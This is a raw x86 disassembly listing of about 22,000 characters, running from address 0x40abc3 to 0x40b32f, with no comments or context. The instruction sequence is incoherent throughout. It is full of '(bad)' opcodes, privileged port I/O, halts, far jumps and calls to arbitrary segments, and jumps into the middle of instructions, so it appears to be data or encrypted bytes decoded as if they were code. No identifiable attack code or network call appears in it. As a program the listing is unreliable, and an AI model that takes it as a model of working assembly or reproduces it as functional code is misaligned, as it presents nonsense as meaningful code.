  40abc3:	mov    ch,0x89
  40abc5:	cmp    DWORD PTR [ecx-0x727f2e73],esi
  40abcb:	sahf   
  40abcc:	sti    
  40abcd:	dec    eax
  40abce:	pop    edi
  40abcf:	sbb    bh,0xb6
  40abd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abd3:	in     al,0xbe
  40abd5:	daa    
  40abd6:	pmaxub mm7,QWORD PTR [esi+0x1b]
  40abda:	cmp    edx,eax
  40abdc:	loop   0x40ab86
  40abde:	inc    eax
  40abdf:	dec    eax
  40abe0:	add    al,0x8a
  40abe2:	sbb    eax,0xae517a85
  40abe7:	jbe    0x40ac27
  40abe9:	mov    DWORD PTR [ecx+edi*1],edx
  40abec:	pop    ds
  40abed:	jns    0x40abe1
  40abef:	xor    bh,BYTE PTR [edi-0x1d]
  40abf2:	scas   eax,DWORD PTR es:[edi]
  40abf3:	mov    esp,0x418d8d9f
  40abf8:	gs iret 
  40abfa:	(bad)  
  40abfb:	into   
  40abfc:	mov    esp,0xda363d98
  40ac01:	push   esi
  40ac02:	in     eax,dx
  40ac03:	jnp    0x40abb0
  40ac05:	aad    0x62
  40ac07:	cmp    al,0x3e
  40ac09:	in     al,0x77
  40ac0b:	(bad)  
  40ac0c:	mov    edi,0x4deae63f
  40ac11:	leave  
  40ac12:	cdq    
  40ac13:	jae    0x40aba4
  40ac15:	rcr    bh,1
  40ac17:	fsub   DWORD PTR [esi+0x25c4dfd3]
  40ac1d:	sti    
  40ac1e:	les    ebp,FWORD PTR [edx-0x55dc71e1]
  40ac24:	mov    edi,DWORD PTR [eax+0x5b]
  40ac27:	push   esp
  40ac28:	aaa    
  40ac29:	mov    esi,0x88aca2cc
  40ac2e:	jp     0x40aca7
  40ac30:	fistp  QWORD PTR [esi-0x33]
  40ac33:	mov    ds:0xa23ed568,al
  40ac38:	rep lods eax,DWORD PTR ds:[esi]
  40ac3a:	loopne 0x40ac52
  40ac3c:	xor    eax,0x2330800
  40ac41:	xchg   DWORD PTR [ecx+0x436dfa80],ebx
  40ac47:	mov    bh,0xd3
  40ac49:	data16 sahf 
  40ac4b:	sub    eax,0x155b01a6
  40ac50:	jbe    0x40ac20
  40ac52:	mov    dl,0x6c
  40ac54:	push   ebp
  40ac55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac56:	ja     0x40ac76
  40ac58:	cwde   
  40ac59:	sub    al,0x55
  40ac5b:	fdivr  DWORD PTR [ebp-0x6c]
  40ac5e:	jecxz  0x40ac90
  40ac60:	adc    BYTE PTR ds:0xec1aea90,0x6c
  40ac67:	mov    edx,DWORD PTR ss:[esi-0x3f]
  40ac6b:	lds    eax,FWORD PTR [edi-0x59d319cc]
  40ac71:	leave  
  40ac72:	pop    esi
  40ac73:	sbb    eax,0xb41fbbfe
  40ac78:	dec    DWORD PTR [esi-0x19]
  40ac7b:	pop    ebx
  40ac7c:	add    eax,0xc79d4710
  40ac81:	pop    edx
  40ac82:	aaa    
  40ac83:	add    eax,ebp
  40ac85:	jl     0x40acc5
  40ac87:	inc    edi
  40ac88:	inc    ebp
  40ac89:	mov    WORD PTR [ecx-0x5],es
  40ac8c:	xor    al,0x60
  40ac8e:	ins    DWORD PTR es:[edi],dx
  40ac8f:	xor    al,0x97
  40ac91:	scas   eax,DWORD PTR es:[edi]
  40ac92:	dec    esp
  40ac93:	adc    BYTE PTR [edx-0x7c],dh
  40ac96:	adc    dh,dl
  40ac98:	mov    cl,0xfb
  40ac9a:	jmp    0xc00b:0x91ec8f58
  40aca1:	loop   0x40accc
  40aca3:	mov    ebp,0x41023970
  40aca8:	or     DWORD PTR [ebp+0x68080a8d],ebp
  40acae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acaf:	mov    cl,BYTE PTR [esi-0x25]
  40acb2:	cdq    
  40acb3:	add    DWORD PTR [ecx+0x61],ebx
  40acb6:	mov    al,0x21
  40acb8:	mov    eax,ds:0xdaebd6a7
  40acbd:	cli    
  40acbe:	out    dx,eax
  40acbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acc0:	fdivr  DWORD PTR [esi+0x53]
  40acc3:	and    DWORD PTR [edx-0x438e923a],esp
  40acc9:	push   esp
  40acca:	inc    esi
  40accb:	pop    ss
  40accc:	and    eax,0x71f11a98
  40acd1:	xchg   esi,eax
  40acd2:	jp     0x40acb2
  40acd4:	mov    edi,0xcaaefc58
  40acd9:	add    eax,0xd3e08060
  40acde:	add    BYTE PTR [ecx],cl
  40ace0:	(bad)  
  40ace2:	shr    BYTE PTR [ecx-0x2035030d],0x39
  40ace9:	(bad)  
  40acea:	and    ecx,DWORD PTR [edi]
  40acec:	lahf   
  40aced:	scas   al,BYTE PTR es:[edi]
  40acee:	jmp    0x128f:0xbc29a8f3
  40acf5:	and    DWORD PTR [esp+edi*4+0x5f],ebx
  40acf9:	imul   ecx,ebp,0xffffff97
  40acfc:	mov    edi,0xf9df2cf2
  40ad01:	fimul  WORD PTR [ebp+0x76]
  40ad04:	dec    esi
  40ad05:	jge    0x40ac97
  40ad07:	(bad)  
  40ad08:	loope  0x40ad33
  40ad0a:	push   es
  40ad0b:	sbb    esp,DWORD PTR [edi]
  40ad0d:	dec    eax
  40ad0e:	xchg   edx,eax
  40ad0f:	into   
  40ad10:	mov    ds:0x5c7babae,al
  40ad15:	fdiv   st(6),st
  40ad17:	add    dl,0xc7
  40ad1a:	iret   
  40ad1b:	sbb    bl,BYTE PTR [ebx+0x35]
  40ad1e:	push   ecx
  40ad1f:	out    dx,eax
  40ad20:	cs pushf 
  40ad22:	xor    DWORD PTR [eax+0x653f23c0],esi
  40ad28:	pushf  
  40ad29:	aas    
  40ad2a:	into   
  40ad2b:	js     0x40ad3d
  40ad2d:	(bad)  
  40ad2e:	outs   dx,BYTE PTR ds:[esi]
  40ad2f:	mov    ss,WORD PTR [ebp+0x3a308d97]
  40ad35:	sar    bh,1
  40ad37:	fcom   DWORD PTR [edi]
  40ad39:	and    BYTE PTR [esi+eax*8+0x1cb4bd58],ch
  40ad40:	pop    eax
  40ad41:	sub    al,0xcd
  40ad43:	test   eax,0xba3aa2c0
  40ad48:	imul   BYTE PTR [ebx+0x2babfabf]
  40ad4e:	out    0x8,eax
  40ad50:	mov    edi,0x61c725f
  40ad55:	push   eax
  40ad56:	fnstsw WORD PTR [ebp+0x59]
  40ad59:	xchg   esi,eax
  40ad5a:	pusha  
  40ad5b:	sub    eax,0xd3e450a2
  40ad60:	cmp    BYTE PTR [edi],0xfa
  40ad63:	jg     0x40ad63
  40ad65:	or     eax,0x46b125b2
  40ad6a:	push   esp
  40ad6b:	xchg   ebp,eax
  40ad6c:	mov    bl,0x6a
  40ad6e:	je     0x40ad47
  40ad70:	fld    QWORD PTR [edx+0x76]
  40ad73:	(bad)  
  40ad74:	xchg   ecx,eax
  40ad75:	jnp    0x40ad68
  40ad77:	add    esp,eax
  40ad79:	fucomi st,st(6)
  40ad7b:	je     0x40ad9b
  40ad7d:	(bad)  
  40ad7e:	jl     0x40adc8
  40ad80:	sub    DWORD PTR [ecx],ebp
  40ad82:	mov    ch,0x26
  40ad84:	mov    DWORD PTR [esi-0x5a],esp
  40ad87:	or     ebx,esi
  40ad89:	add    bl,BYTE PTR [esp+ebx*1]
  40ad8c:	in     al,dx
  40ad8d:	jae    0x40ad72
  40ad8f:	xchg   esi,eax
  40ad90:	rcr    edx,0xd4
  40ad93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad94:	add    BYTE PTR [edi],ch
  40ad96:	inc    edx
  40ad97:	sub    BYTE PTR [esi+0x5d],0x82
  40ad9b:	rol    BYTE PTR [ebx],1
  40ad9d:	push   ebx
  40ad9e:	cmp    DWORD PTR [ebx],eax
  40ada0:	sbb    ecx,0x69
  40ada3:	add    DWORD PTR [edi+esi*1+0x2078c91],eax
  40adaa:	fisttp WORD PTR [edx]
  40adac:	xchg   ebp,eax
  40adad:	adc    dh,BYTE PTR [ebx+edi*4+0xe]
  40adb1:	add    al,0xe6
  40adb3:	cdq    
  40adb4:	es (bad) 
  40adb6:	jp     0x40adbd
  40adb8:	daa    
  40adb9:	xor    DWORD PTR [ebp+0x6f],ebx
  40adbc:	int3   
  40adbd:	push   ds
  40adbe:	dec    esp
  40adbf:	lods   al,BYTE PTR ds:[esi]
  40adc0:	les    ecx,FWORD PTR [ebp+0x53]
  40adc3:	and    BYTE PTR [edx-0x53],ch
  40adc6:	add    BYTE PTR ss:[eax+0x73],cl
  40adca:	jl     0x40ae0d
  40adcc:	pusha  
  40adcd:	sub    eax,0x3d09871
  40add2:	push   eax
  40add3:	or     eax,0x81519a7c
  40add8:	sub    ch,al
  40adda:	sbb    bl,cl
  40addc:	inc    esi
  40addd:	idiv   DWORD PTR [edx]
  40addf:	mov    edi,0x3e52b7f2
  40ade4:	stc    
  40ade5:	pop    edi
  40ade6:	cmp    eax,0xa8ea5286
  40adeb:	test   BYTE PTR [esi-0xa0e75c5],dl
  40adf1:	lods   al,BYTE PTR ds:[esi]
  40adf2:	xchg   esp,eax
  40adf3:	loop   0x40ad7a
  40adf5:	outs   dx,DWORD PTR ds:[esi]
  40adf6:	mov    edi,0xf8ff97c4
  40adfb:	and    eax,0x61ef9bfa
  40ae00:	arpl   WORD PTR [edx+ecx*4-0x22],si
  40ae04:	pusha  
  40ae05:	pop    es
  40ae06:	xchg   ebp,eax
  40ae07:	not    al
  40ae09:	mov    BYTE PTR [esi+0x2a],0xbd
  40ae0d:	sar    BYTE PTR [eax-0x4f],1
  40ae10:	test   al,0xfa
  40ae12:	or     al,BYTE PTR [ebp+eax*2+0x5e2d0265]
  40ae19:	lea    edi,[ebx]
  40ae1b:	push   0xffffffc1
  40ae1d:	pop    esp
  40ae1e:	stos   DWORD PTR es:[edi],eax
  40ae1f:	(bad)  
  40ae20:	cmp    eax,0x76a21e6a
  40ae25:	out    dx,al
  40ae26:	inc    ebp
  40ae27:	fistp  DWORD PTR [eax+0x20]
  40ae2a:	lds    esi,FWORD PTR [edx+0x5b]
  40ae2d:	stos   BYTE PTR es:[edi],al
  40ae2e:	xchg   esp,eax
  40ae2f:	aas    
  40ae30:	mov    ds:0xba0965ff,al
  40ae35:	mov    ah,0x6c
  40ae37:	hlt    
  40ae38:	sub    al,0x52
  40ae3a:	les    eax,FWORD PTR [eax-0x1d]
  40ae3d:	out    dx,eax
  40ae3e:	aad    0xb7
  40ae40:	scas   eax,DWORD PTR es:[edi]
  40ae41:	rcl    BYTE PTR [eax+0x2af1e3c6],0x47
  40ae48:	jmp    0xc1f02a46
  40ae4d:	mov    bh,0x27
  40ae4f:	(bad)  
  40ae50:	int    0x4
  40ae52:	je     0x40aebd
  40ae54:	pushf  
  40ae55:	inc    edx
  40ae56:	mov    edx,0x9fdecdf5
  40ae5b:	mov    cl,0xf3
  40ae5d:	mov    eax,ds:0x75e4d90e
  40ae62:	out    0x2f,al
  40ae64:	sbb    ecx,esp
  40ae66:	in     eax,dx
  40ae67:	push   cs
  40ae68:	sbb    BYTE PTR [ecx+0x5285056c],al
  40ae6e:	mov    ah,0xdb
  40ae70:	sub    eax,0x4cc70f0e
  40ae75:	es xchg ebx,eax
  40ae77:	call   0x773d:0x92f7e2d
  40ae7e:	push   ebx
  40ae7f:	call   0x93813167
  40ae84:	xchg   esi,eax
  40ae85:	ret    0x6d02
  40ae88:	lea    esi,[ecx]
  40ae8a:	in     al,0x59
  40ae8c:	out    0x22,al
  40ae8e:	add    ch,bh
  40ae90:	jle    0x40ae97
  40ae92:	repz (bad) 
  40ae94:	das    
  40ae95:	xor    dh,BYTE PTR [ecx-0x17]
  40ae98:	repnz add eax,0xc402de6e
  40ae9e:	bound  ecx,QWORD PTR [ebx+eax*4-0x6c]
  40aea2:	mov    eax,ds:0x29cad8b9
  40aea7:	push   ebp
  40aea8:	cmp    DWORD PTR [ecx],edi
  40aeaa:	ret    
  40aeab:	sbb    DWORD PTR [edx-0x40111360],0x6d
  40aeb2:	int3   
  40aeb3:	dec    ebp
  40aeb4:	and    eax,0x97eda584
  40aeb9:	adc    eax,0x4a0acd9f
  40aebe:	ins    DWORD PTR es:[edi],dx
  40aebf:	rcl    BYTE PTR [ebp-0x4dd630ed],1
  40aec5:	xchg   esp,eax
  40aec6:	call   0x1321:0x6548144
  40aecd:	(bad)  
  40aecf:	add    al,0xd5
  40aed1:	ret    0x3547
  40aed4:	rol    BYTE PTR ss:[esp+ecx*4],1
  40aed8:	mov    BYTE PTR [edx+0xac10c87],ch
  40aede:	sub    esp,DWORD PTR [edx+0x2690801c]
  40aee4:	sbb    al,0xa8
  40aee6:	jg     0x40af4d
  40aee8:	jbe    0x40af1e
  40aeea:	xor    cl,BYTE PTR [edx]
  40aeec:	sub    edx,DWORD PTR [eax]
  40aeee:	jo     0x40ae91
  40aef0:	shl    DWORD PTR [esi+0x3a],0xe7
  40aef4:	scas   eax,DWORD PTR es:[edi]
  40aef5:	std    
  40aef6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aef7:	cmp    edi,edi
  40aef9:	cmc    
  40aefa:	das    
  40aefb:	jle    0x40ae8d
  40aefd:	jbe    0x40aeba
  40aeff:	jne    0x40aec8
  40af01:	sahf   
  40af02:	outs   dx,BYTE PTR ds:[esi]
  40af03:	xchg   ebp,eax
  40af04:	add    al,0x1a
  40af06:	sub    al,0xa5
  40af08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af09:	shr    ecx,cl
  40af0b:	jo     0x40af0a
  40af0d:	cli    
  40af0e:	sub    eax,0x5ff3f77e
  40af13:	daa    
  40af14:	aaa    
  40af15:	fucomi st,st(4)
  40af17:	ins    BYTE PTR es:[edi],dx
  40af18:	sahf   
  40af19:	mov    ds:0xdda1dfdb,eax
  40af1e:	sbb    DWORD PTR [edx-0x4],esp
  40af21:	mov    al,ds:0x5f7d1aa9
  40af26:	mov    eax,0x72bd179c
  40af2b:	int3   
  40af2c:	ss push ss
  40af2e:	push   edi
  40af2f:	and    DWORD PTR [eax+0x528188a5],eax
  40af35:	les    ecx,FWORD PTR [esi-0xa6ae4c1]
  40af3b:	inc    eax
  40af3c:	and    BYTE PTR [edx-0x17],al
  40af3f:	sbb    BYTE PTR [edx+eax*1],ah
  40af42:	int    0x8b
  40af44:	cdq    
  40af45:	es push 0xcfe39c23
  40af4b:	jg     0x40aed7
  40af4d:	adc    cl,BYTE PTR [edx-0x6815ccae]
  40af53:	or     dl,bl
  40af55:	mov    ch,0xe7
  40af57:	lea    edi,[edi+0x15c021c7]
  40af5d:	sbb    eax,0x21abbd5
  40af62:	test   bl,ah
  40af64:	add    eax,eax
  40af66:	sub    eax,esi
  40af68:	or     DWORD PTR [esi],edi
  40af6a:	dec    ecx
  40af6b:	mov    ebp,ebx
  40af6d:	pop    ds
  40af6e:	mov    edi,0x3397fb48
  40af73:	jle    0x40af66
  40af75:	addr16 aas 
  40af77:	rol    DWORD PTR [ebx-0x8736c7d],0x27
  40af7e:	mov    esp,0x7c1ba5fe
  40af83:	sti    
  40af84:	pop    edi
  40af85:	in     eax,dx
  40af86:	xor    DWORD PTR [ebp+0x524242e0],edi
  40af8c:	mov    edx,0xbad6afd8
  40af91:	repnz add DWORD PTR [edx+ebp*2-0x43cc08e4],ebp
  40af99:	ja     0x40afd2
  40af9b:	cmp    ebx,DWORD PTR [edi]
  40af9d:	ja     0x40af3a
  40af9f:	fild   QWORD PTR [ebp+0x200000]
  40afa5:	dec    ecx
  40afa6:	inc    esp
  40afa7:	inc    ecx
  40afa8:	push   esp
  40afa9:	push   esi
  40afaa:	fwait
  40afab:	add    edx,DWORD PTR [edx-0x46]
  40afae:	pop    ecx
  40afaf:	outs   dx,BYTE PTR ds:[esi]
  40afb0:	stos   BYTE PTR es:[edi],al
  40afb1:	xchg   ebp,eax
  40afb2:	pop    ecx
  40afb3:	and    esp,DWORD PTR [edi-0x23d965a2]
  40afb9:	mov    eax,0xb1839b71
  40afbe:	hlt    
  40afbf:	mov    ecx,0xc5f95e36
  40afc4:	loop   0x40afa0
  40afc6:	jno    0x40afd0
  40afc8:	mov    al,0xb2
  40afca:	int3   
  40afcb:	in     eax,dx
  40afcc:	bound  edi,QWORD PTR [edi]
  40afce:	mov    esi,0x4066c541
  40afd3:	call   0x74d344a7
  40afd8:	cmp    cl,BYTE PTR [edx-0x46af5a4c]
  40afde:	inc    esi
  40afdf:	jnp    0x40afae
  40afe1:	xchg   esi,eax
  40afe2:	adc    cl,BYTE PTR [esi-0x63]
  40afe5:	enter  0xb538,0x93
  40afe9:	jno    0x40afe1
  40afeb:	mov    ah,0xe5
  40afed:	shl    DWORD PTR [ebx+0x7d],0xba
  40aff1:	fld    QWORD PTR [ecx+esi*8+0x4b85ce61]
  40aff8:	xchg   DWORD PTR [edi+ebp*8+0x15],edi
  40affc:	retf   
  40affd:	cmc    
  40affe:	fst    QWORD PTR [ebx]
  40b000:	push   0xbd95d693
  40b005:	xchg   edx,eax
  40b006:	js     0x40afa4
  40b008:	and    BYTE PTR [eax+0x39],0x2a
  40b00c:	ror    BYTE PTR [esp+esi*1-0xa6a3dd4],1
  40b013:	jmp    0x77206da
  40b018:	pop    es
  40b019:	add    bl,BYTE PTR [edi]
  40b01b:	jp     0x40b019
  40b01d:	push   es
  40b01e:	mov    edi,0xc63ddff1
  40b023:	mov    ecx,0x50b83bb3
  40b028:	loopne 0x40b014
  40b02a:	icebp  
  40b02b:	push   ds
  40b02c:	icebp  
  40b02d:	cmp    ebp,DWORD PTR [ecx+0x6e]
  40b030:	mov    bh,0xd6
  40b032:	in     eax,0x59
  40b034:	in     al,0x79
  40b036:	into   
  40b037:	pop    ss
  40b038:	push   eax
  40b03a:	jmp    0x40aff8
  40b03c:	jne    0x40aff7
  40b03e:	in     al,0xf4
  40b040:	fld    DWORD PTR [edi-0x18]
  40b043:	je     0x40affc
  40b045:	call   0x6498f6be
  40b04a:	ins    DWORD PTR es:[edi],dx
  40b04b:	mov    edx,0x38588475
  40b050:	hlt    
  40b051:	in     al,dx
  40b052:	adc    BYTE PTR [ecx+0x6b30d108],0x44
  40b059:	add    eax,DWORD PTR [esp+edi*1]
  40b05c:	js     0x40afe7
  40b05e:	lds    ecx,FWORD PTR [ebx-0x4d13557]
  40b064:	or     ebp,DWORD PTR [edx+eax*8]
  40b067:	out    dx,eax
  40b068:	pop    edi
  40b069:	dec    esp
  40b06a:	sbb    eax,0xb72a226
  40b06f:	xchg   esi,eax
  40b070:	pop    ss
  40b071:	jl     0x40b073
  40b073:	aad    0x78
  40b075:	add    ch,ch
  40b077:	xchg   BYTE PTR [eax+0x1b],cl
  40b07a:	pop    ebp
  40b07b:	mov    ds:0xdba94664,al
  40b080:	xor    eax,0x96d9bf7b
  40b085:	(bad)
  40b089:	mov    ebx,0x6384021c
  40b08e:	data16 add al,BYTE PTR [edx-0x125261ad]
  40b095:	ins    DWORD PTR es:[edi],dx
  40b096:	push   ds
  40b097:	mov    esi,0xff9718f9
  40b09c:	hlt    
  40b09d:	adc    eax,0xa79faebe
  40b0a2:	test   DWORD PTR [ecx-0x49d8cf1],0xdffd3f24
  40b0ac:	hlt    
  40b0ad:	imul   ebp,DWORD PTR [edi+0x5c],0xf8ff4be2
  40b0b4:	xor    dl,bl
  40b0b6:	leave  
  40b0b7:	add    al,0xa5
  40b0b9:	jmp    0x4ab0:0x1551c026
  40b0c0:	mov    ds,WORD PTR [ebx]
  40b0c2:	cli    
  40b0c3:	imul   ebp,esi,0xfffffff7
  40b0c6:	idiv   DWORD PTR [edi+ecx*8-0x29]
  40b0ca:	push   edx
  40b0cb:	dec    edx
  40b0cc:	xchg   ecx,eax
  40b0cd:	sti    
  40b0ce:	mov    DWORD PTR [eax+0x63],eax
  40b0d1:	inc    edx
  40b0d2:	sbb    eax,0xaf57821c
  40b0d7:	fisub  WORD PTR [edx+0x3e]
  40b0da:	in     eax,dx
  40b0db:	inc    eax
  40b0dc:	push   0xffffff91
  40b0de:	sbb    BYTE PTR [edx],0x0
  40b0e1:	xor    al,0xf3
  40b0e3:	aaa    
  40b0e4:	stos   BYTE PTR es:[edi],al
  40b0e5:	outs   dx,BYTE PTR ss:[esi]
  40b0e7:	pop    ss
  40b0e8:	and    DWORD PTR [eax-0x7c],eax
  40b0eb:	ret    0x51fa
  40b0ee:	and    eax,0x45431ae
  40b0f3:	adc    al,0x29
  40b0f5:	mov    eax,ds:0xb4e84add
  40b0fa:	adc    esp,DWORD PTR [esi-0x2d]
  40b0fd:	sbb    BYTE PTR [ebx+ecx*8],0xc6
  40b101:	pusha  
  40b102:	into   
  40b103:	pop    es
  40b104:	sahf   
  40b105:	enter  0x2bf8,0x9f
  40b109:	cmp    al,cl
  40b10b:	inc    edi
  40b10c:	jg     0x40b0f8
  40b10e:	jge    0x40b0ac
  40b110:	cmp    DWORD PTR [ebx-0x542850b3],esi
  40b116:	sahf   
  40b117:	sub    eax,0xf85e73cf
  40b11c:	idiv   BYTE PTR [ecx-0x2]
  40b11f:	out    dx,eax
  40b120:	jg     0x40b119
  40b122:	jge    0x40b122
  40b124:	in     al,0xb9
  40b126:	cs sar esp,cl
  40b129:	add    al,0x96
  40b12b:	push   es
  40b12c:	or     ah,al
  40b12e:	push   cs
  40b12f:	ret    
  40b130:	mov    dl,BYTE PTR [edx]
  40b132:	inc    edi
  40b133:	mov    ebp,0xb35fd859
  40b138:	and    ah,dl
  40b13a:	sahf   
  40b13b:	xor    BYTE PTR [edx],dh
  40b13d:	adc    ebp,DWORD PTR [edx]
  40b13f:	jg     0x40b101
  40b141:	ret    0xb829
  40b144:	xor    edi,DWORD PTR [esi+ecx*8+0x6edff0ff]
  40b14b:	lock in al,0x13
  40b14e:	sub    esp,DWORD PTR [bx+si-0x4191]
  40b153:	(bad)  
  40b154:	out    0xff,al
  40b156:	or     BYTE PTR es:[ebp+eiz*2-0x1edb6d44],al
  40b15e:	imul   ebx,DWORD PTR [edi-0x1],0x33
  40b162:	(bad)  
  40b163:	in     al,0xeb
  40b165:	scas   eax,DWORD PTR es:[edi]
  40b166:	xor    ebx,edx
  40b168:	jp     0x40b1a9
  40b16a:	std    
  40b16b:	lea    edx,[ebx]
  40b16d:	hlt    
  40b16e:	jp     0x40b1cb
  40b170:	dec    eax
  40b171:	fptan  
  40b173:	cmc    
  40b174:	sbb    eax,DWORD PTR [ebx-0x1d394065]
  40b17a:	addr16 cmc 
  40b17c:	pop    esp
  40b17d:	mov    ebx,DWORD PTR [esi]
  40b17f:	jge    0x40b1a2
  40b181:	cmc    
  40b182:	mov    ds:0x14223cee,al
  40b187:	or     al,0xe0
  40b189:	dec    eax
  40b18a:	add    BYTE PTR [ecx-0x7bd05e46],al
  40b190:	lea    esp,[edx]
  40b192:	mov    al,ds:0x8f08c075
  40b197:	loope  0x40b1df
  40b199:	call   FWORD PTR [ecx-0x41]
  40b19c:	sbb    BYTE PTR [eax+0x462dfff0],ch
  40b1a2:	imul   edx,edx,0x46
  40b1a5:	push   cs
  40b1a6:	inc    eax
  40b1a7:	nop
  40b1a8:	push   eax
  40b1a9:	pop    es
  40b1aa:	dec    edx
  40b1ab:	sub    esi,esi
  40b1ad:	div    edi
  40b1af:	push   edi
  40b1b0:	test   DWORD PTR [eax],eax
  40b1b2:	xor    eax,0xbbd0206e
  40b1b7:	sub    al,bh
  40b1b9:	sahf   
  40b1ba:	adc    al,0x54
  40b1bc:	imul   ecx,ebp,0xffffffe9
  40b1bf:	mov    bl,0xa7
  40b1c1:	clc    
  40b1c2:	in     al,dx
  40b1c3:	pop    es
  40b1c4:	jg     0x40b14f
  40b1c6:	aaa    
  40b1c7:	iret   
  40b1c8:	mov    edi,0x5e67a5ce
  40b1cd:	jecxz  0x40b22a
  40b1cf:	iret   
  40b1d0:	mov    esp,0x31b1e0c4
  40b1d5:	daa    
  40b1d6:	jg     0x40b17a
  40b1d8:	dec    edi
  40b1d9:	push   DWORD PTR [ecx+0x38]
  40b1dc:	stc    
  40b1dd:	dec    ecx
  40b1de:	mov    DWORD PTR [esi+0xd2c6883],ebx
  40b1e4:	jnp    0x40b1c2
  40b1e6:	inc    ecx
  40b1e7:	cmp    al,bh
  40b1e9:	fst    st(6)
  40b1eb:	fmul   QWORD PTR [edi]
  40b1ed:	jne    0x40b1ff
  40b1ef:	cmp    BYTE PTR [edx-0xc207bfb],cl
  40b1f5:	fxch   st(4)
  40b1f7:	das    
  40b1f8:	adc    DWORD PTR [esi-0x63],ebx
  40b1fb:	add    al,0x21
  40b1fd:	and    eax,0x3cde6ac6
  40b202:	jg     0x40b21f
  40b204:	inc    esp
  40b205:	(bad)  
  40b207:	icebp  
  40b208:	stc    
  40b209:	inc    DWORD PTR [edx]
  40b20b:	mov    eax,ds:0x1a061ba4
  40b210:	xchg   esi,eax
  40b211:	xor    ecx,DWORD PTR [ebx]
  40b213:	jg     0x40b219
  40b215:	xchg   ebp,eax
  40b216:	push   ebx
  40b217:	rcl    BYTE PTR [edx],1
  40b219:	sbb    cl,BYTE PTR [edx-0x7bb3e361]
  40b21f:	mov    al,0xa1
  40b221:	add    al,0xab
  40b223:	mov    cl,0x3e
  40b225:	mov    esi,ss
  40b227:	outs   dx,BYTE PTR ds:[esi]
  40b228:	dec    ecx
  40b229:	cli    
  40b22a:	jge    0x40b1f1
  40b22c:	je     0x40b1d8
  40b22e:	sbb    BYTE PTR [esi+0x4c],ch
  40b231:	stc    
  40b232:	stos   DWORD PTR es:[edi],eax
  40b233:	jg     0x40b28e
  40b235:	icebp  
  40b236:	ja     0x40b236
  40b238:	out    0xd3,al
  40b23a:	cmp    al,0xfe
  40b23c:	sahf   
  40b23d:	inc    edi
  40b23e:	stos   DWORD PTR es:[edi],eax
  40b23f:	in     eax,0xad
  40b241:	jecxz  0x40b1fb
  40b243:	mov    edx,0x1f079294
  40b248:	jl     0x40b1da
  40b24a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b24b:	aas    
  40b24c:	cli    
  40b24d:	pop    esi
  40b24e:	(bad)  
  40b24f:	(bad)  
  40b251:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b253:	cld    
  40b254:	pop    edi
  40b255:	push   esi
  40b257:	dec    ebp
  40b258:	fidivr WORD PTR [edx-0x5939ef0a]
  40b25e:	sub    al,0xa5
  40b260:	out    dx,al
  40b261:	scas   al,BYTE PTR es:[edi]
  40b262:	or     al,0xfd
  40b264:	stc    
  40b265:	push   esi
  40b266:	mov    ebp,0xa231d972
  40b26b:	std    
  40b26c:	push   ds
  40b26d:	push   esp
  40b26e:	ret    0xf3e
  40b271:	adc    bl,BYTE PTR [ebp+0x7e67ce56]
  40b277:	es out 0xb3,eax
  40b27a:	lahf   
  40b27b:	dec    BYTE PTR [ecx-0x46]
  40b27e:	fnsave [esi+0x6d]
  40b281:	inc    edx
  40b282:	retf   
  40b283:	push   ebp
  40b284:	mov    ebp,0xb1cf5c7c
  40b289:	dec    eax
  40b28a:	sub    ecx,ebp
  40b28c:	jbe    0x40b249
  40b28e:	pop    esp
  40b28f:	mov    esi,0xffcf9572
  40b294:	(bad)  
  40b295:	aaa    
  40b296:	mov    cl,0xea
  40b298:	xor    al,0xfd
  40b29a:	loope  0x40b2f5
  40b29c:	pop    edx
  40b29d:	popf   
  40b29e:	dec    ebp
  40b29f:	fs shl cl,cl
  40b2a2:	jmp    0x40b2df
  40b2a4:	xor    al,0x7a
  40b2a6:	hlt    
  40b2a7:	enter  0xb10d,0xe8
  40b2ab:	mov    eax,0xcfbc9445
  40b2b0:	inc    edx
  40b2b1:	shr    DWORD PTR [ebx+0x503675fd],0xa9
  40b2b8:	mov    dl,0x8
  40b2ba:	adc    al,0xbf
  40b2bc:	jmp    0x44f3adc
  40b2c1:	outs   dx,DWORD PTR ds:[esi]
  40b2c2:	les    esp,FWORD PTR ds:[esi-0x39]
  40b2c6:	add    al,al
  40b2c8:	lods   eax,DWORD PTR ds:[esi]
  40b2c9:	jne    0x40b274
  40b2cb:	fsubr  QWORD PTR [esi+0x65]
  40b2ce:	fs mov bh,0x66
  40b2d1:	bound  ebx,QWORD PTR [ecx+0x4a]
  40b2d4:	mov    al,0x13
  40b2d6:	inc    esi
  40b2d7:	ret    
  40b2d8:	xor    BYTE PTR [esi-0x7f4e575c],cl
  40b2de:	push   eax
  40b2df:	aaa    
  40b2e0:	dec    edx
  40b2e1:	sub    DWORD PTR [edx-0xf759a94],esi
  40b2e7:	xchg   esp,eax
  40b2e8:	pop    ds
  40b2e9:	and    eax,0x1382013
  40b2ee:	sub    DWORD PTR ds:0xf119da3d,0x53
  40b2f5:	cmp    ecx,DWORD PTR [edi-0xd]
  40b2f8:	mov    eax,ds:0x7a5ca3e2
  40b2fd:	jmp    0x40b331
  40b2ff:	scas   eax,DWORD PTR es:[edi]
  40b300:	mov    ebp,0xbfd732f8
  40b305:	jp     0x40b290
  40b307:	pop    ebx
  40b308:	rep stos DWORD PTR es:[edi],eax
  40b30a:	int3   
  40b30b:	scas   al,BYTE PTR es:[edi]
  40b30c:	es and al,0x3f
  40b30f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b310:	nop
  40b311:	push   edx
  40b312:	xchg   ecx,eax
  40b313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b314:	sub    eax,0x46551084
  40b319:	pop    eax
  40b31a:	nop
  40b31b:	jecxz  0x40b315
  40b31d:	add    dh,ch
  40b31f:	gs pop ebx
  40b321:	mov    eax,0x503d55b7
  40b326:	repz cmp dh,cl
  40b329:	jae    0x40b2eb
  40b32b:	ret    0x3027
  40b32e:	pop    edi
  40b32f:	cmp    DWORD PTR [ebx],edx
